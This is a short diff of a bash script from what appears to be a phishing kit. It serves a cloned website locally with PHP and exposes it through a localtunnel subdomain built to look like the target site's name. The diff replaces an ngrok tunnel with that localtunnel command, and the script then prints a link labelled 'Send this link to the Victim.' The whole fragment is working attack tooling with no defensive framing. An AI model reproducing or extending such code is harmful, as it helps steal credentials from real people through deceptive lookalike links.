@@ -431,8 +431,6 @@ cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 8
 lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
 sleep 4
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
